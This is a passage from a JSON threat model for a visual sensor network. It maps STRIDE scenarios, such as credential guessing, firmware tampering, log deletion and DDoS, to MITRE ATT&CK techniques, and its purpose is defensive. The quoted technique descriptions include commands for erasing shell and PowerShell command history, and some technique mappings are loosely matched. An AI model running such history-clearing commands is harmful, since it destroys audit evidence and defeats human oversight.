                    "Assumption": "Weak or easily guessable admin credentials in use.",
                    "Role": "Admin",
                    "Condition": "Poor password management practices."
                },
                {
                    "Assumption": "Lack of multi-factor authentication (MFA) for admin access.",
                    "Role": "System Administrator",
                    "Condition": "Basic or no MFA setup."
                },
                {
                    "Assumption": "Intercepting admin credentials through man-in-the-middle (MITM) attacks.",
                    "Role": "Attacker",
                    "Condition": "Vulnerable communication channels."
                }
            ],
            "Potential Impact": "Complete system control leading to data manipulation and unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity",
                "credentials",
                "admin access"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof sensor node signals to mislead system monitoring and decision-making.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network and can monitor traffic patterns.",
                    "Role": "Attacker",
                    "Condition": "Network is not fully secured."
                },
                {
                    "Assumption": "Signals lack crypto-based authentication.",
                    "Role": "System Designer",
                    "Condition": "Weak signal validation mechanisms."
                },
                {
                    "Assumption": "Lack of anomaly detection for signal consistency.",
                    "Role": "Security Administrator",
                    "Condition": "No anomaly detection systems in place."
                }
            ],
            "Potential Impact": "Disruption of accurate data collection and potential decision errors.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "signal",
                "network",
                "sensor data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a camera node and modifies its firmware to capture data illicitly.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can physically access camera nodes.",
                    "Role": "Attacker",
                    "Condition": "Nodes are in unprotected or public areas."
                },
                {
                    "Assumption": "Firmware is either not encrypted or cryptographically weak.",
                    "Role": "System Designer",
                    "Condition": "Inadequate firmware security."
                },
                {
                    "Assumption": "Firmware updates are poorly managed without adequate security checks.",
                    "Role": "Admin",
                    "Condition": "Weak update management processes."
                }
            ],
            "Potential Impact": "Unauthorized data collection, integrity loss, and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "physical access",
                "camera node"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits known CVE vulnerabilities in Linux to modify crucial system files.",
            "Assumptions": [
                {
                    "Assumption": "The system is running vulnerable versions of Linux software.",
                    "Role": "System Administrator",
                    "Condition": "Not updated to the latest patches."
                },
                {
                    "Assumption": "The attacker has some level of privileged access or can escalate privileges.",
                    "Role": "Attacker",
                    "Condition": "Existing privilege escalation vulnerabilities."
                },
                {
                    "Assumption": "Monitoring systems fail to detect unauthorized file modifications.",
                    "Role": "Security Admin",
                    "Condition": "Inadequate monitoring solutions."
                }
            ],
            "Potential Impact": "System integrity compromised and potential for prolonged undetected malicious activities.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "linux",
                "vulnerabilities",
                "system files"
            ],
            "mitre_technique": {
                "name": "Malicious Shell Modification",
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). \n\nFor macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                "id": "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8",
                "technique_id": "T1156"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actor modifies configuration files of the VSN to reroute data to unauthorized destinations.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are not secured or encrypted.",
                    "Role": "System Designer",
                    "Condition": "Lack of security in config management."
                },
                {
                    "Assumption": "Weak access control policies on configuration files.",
                    "Role": "Administrator",
                    "Condition": "Access control policies not stringent."
                },
                {
                    "Assumption": "No regular integrity checks on critical files.",
                    "Role": "Security Admin",
                    "Condition": "Absence of file integrity monitoring."
                }
            ],
            "Potential Impact": "Unauthorized data disclosures and data integrity loss through configuration manipulations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration files",
                "unauthorized access",
                "network reroute"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An unauthorized actor deletes logs to obscure malicious activities on the IoT network.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored locally without redundant copies.",
                    "Role": "System Administrator",
                    "Condition": "Weak log management practices."
                },
                {
                    "Assumption": "Users have delete permissions on log files.",
                    "Role": "Administrator",
                    "Condition": "Improper access control policies."
                },
                {
                    "Assumption": "No secure logging mechanisms in place to prevent tampering.",
                    "Role": "Security Admin",
                    "Condition": "Logging mechanisms are basic and lack security."
                }
            ],
            "Potential Impact": "Loss of forensic evidence and difficulties in incident response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log deletion",
                "forensics",
                "log management"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker uses the XXE vulnerability to wipe audit trails within the system.",
            "Assumptions": [
                {
                    "Assumption": "The XXE vulnerability exists in the application.",
                    "Role": "Developer",
                    "Condition": "Application is not patched."
                },
                {
                    "Assumption": "Audit trails are not redundantly stored or protected.",
                    "Role": "System Admin",
                    "Condition": "Weak audit trail protection."
                },
                {
                    "Assumption": "The system lacks mechanisms for detecting audit trail manipulations.",
                    "Role": "Security Admin",
                    "Condition": "No integrity checks on audit files."
                }
            ],
            "Potential Impact": "Loss of crucial audit information and challenges in cyber forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "XML external entity",
                "audit trails",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious actor compromises the administrative interface to manipulate user logs.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities in the administrative interface exist.",
                    "Role": "Developer",
                    "Condition": "No security updates applied."
                },
                {
                    "Assumption": "Improper access controls around log management.",
                    "Role": "Administrator",
                    "Condition": "Weak log access control."
                },
                {
                    "Assumption": "No monitoring of admin actions for log changes.",
                    "Role": "Security Admin",
                    "Condition": "Lack of monitoring solutions."
                }
            ],
            "Potential Impact": "Falsified logs, making it difficult to trace malicious activities and proving actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "admin interface",
                "log manipulation",
                "user logs"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive visual data intercepted in transit due to lack of encryption.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Use of plain text protocols."
                },
                {
                    "Assumption": "The attacker has the ability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                },
                {
                    "Assumption": "No network segmentation to protect sensitive data flows.",
                    "Role": "Network Admin",
                    "Condition": "Flat network architecture."
                }
            ],
            "Potential Impact": "Unauthorized exposure of sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted traffic",
                "interception",
                "visual data"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exploitation of deserialization vulnerability in Apache EventMesh leads to data leaks.",
            "Assumptions": [
                {
                    "Assumption": "Application uses vulnerable versions of Apache EventMesh.",
                    "Role": "Developer",
                    "Condition": "Not updated to latest patches."
                },
                {
                    "Assumption": "Attackers can send specifically crafted messages.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of the exploit."
                },
                {
                    "Assumption": "Sensitive data processed by the vulnerable component.",
                    "Role": "System Designer",
                    "Condition": "Inclusion of sensitive data in processed messages."
                }
            ],
            "Potential Impact": "Sensitive data disclosure through remote code execution.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "deserialization",
                "code execution",
                "data leaks"
            ],
            "mitre_technique": {
                "name": "Exploitation for Client Execution",
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
                "technique_id": "T1203"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Misconfiguration leads to exposure of sensitive configuration files on the network.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are not properly secured.",
                    "Role": "System Admin",
                    "Condition": "Improper file permissions."
                },
                {
                    "Assumption": "Network access to configuration directories.",
                    "Role": "Attacker",
                    "Condition": "Access to network shares."
                },
                {
                    "Assumption": "Lack of network segmentation to limit access to sensitive directories.",
                    "Role": "Network Admin",
                    "Condition": "Inadequate network protections."
                }
            ],
            "Potential Impact": "Exposure of sensitive system configurations, leading to potential further exploits.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "misconfiguration",
                "sensitive files",
                "network exposure"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A distributed denial of service (DDoS) attack overwhelms the VSN, causing failure in data collection.",
            "Assumptions": [
                {
                    "Assumption": "No DDoS mitigation mechanisms in place.",
                    "Role": "Network Admin",
                    "Condition": "No anti-DDoS technology employed."
                },
                {
                    "Assumption": "Attackers have sufficient resources to launch a DDoS.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets."
                },
                {
                    "Assumption": "Critical functions of VSN systems are dependent on continuous availability.",
                    "Role": "System Designer",
                    "Condition": "No failover or redundancy."
                }
            ],
            "Potential Impact": "System downtime, loss of data collection, and potential loss of revenue.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network",
                "overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of NVIDIA kernel mode vulnerabilities results in system crashes.",
            "Assumptions": [
                {
                    "Assumption": "The system is using vulnerable versions of NVIDIA drivers.",
                    "Role": "System Admin",
                    "Condition": "Not updated to the latest patches."
                },
                {
                    "Assumption": "Attackers can execute a specially crafted shader.",
                    "Role": "Attacker",
                    "Condition": "Access to system resources."
                },
                {
                    "Assumption": "No validation for shaders before execution.",
                    "Role": "System Designer",
                    "Condition": "Weak shader validation mechanisms."
                }
            ],
            "Potential Impact": "System instability and potential crashes, resulting in downtime.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "NVIDIA",
                "kernel mode",
                "system crashes"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Directory traversal vulnerability in Tauri applications is exploited to disrupt VSN operations.",
            "Assumptions": [
                {
                    "Assumption": "Using vulnerable versions of Tauri framework.",
                    "Role": "Developer",
                    "Condition": "Not updated to the patched version."
                },
                {
                    "Assumption": "Improper validation of filesystem operations.",
                    "Role": "System Designer",
                    "Condition": "Weak validation for file operations."
                },
                {
                    "Assumption": "The attacker has knowledge of the directory structure.",
                    "Role": "Attacker",
                    "Condition": "Awareness of system configuration."
                }
            ],
            "Potential Impact": "Inaccessibility of crucial system files, leading to operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "directory traversal",
                "filesystem",
                "disruption"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses code injection vulnerabilities to gain higher permissions and control over VSN.",
            "Assumptions": [
                {
                    "Assumption": "Application contains exploitable code injection vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "Unpatched vulnerabilities present."
                },
                {
                    "Assumption": "The attacker can access the application interface.",
                    "Role": "Attacker",
                    "Condition": "Access to application endpoints."
                },
                {
                    "Assumption": "Application runs with higher permissions than necessary.",
                    "Role": "System Admin",
                    "Condition": "Misconfigured permission levels."
                }
            ],
            "Potential Impact": "Full control of system, leading to potential data tampering and unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "code injection",
                "permissions",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
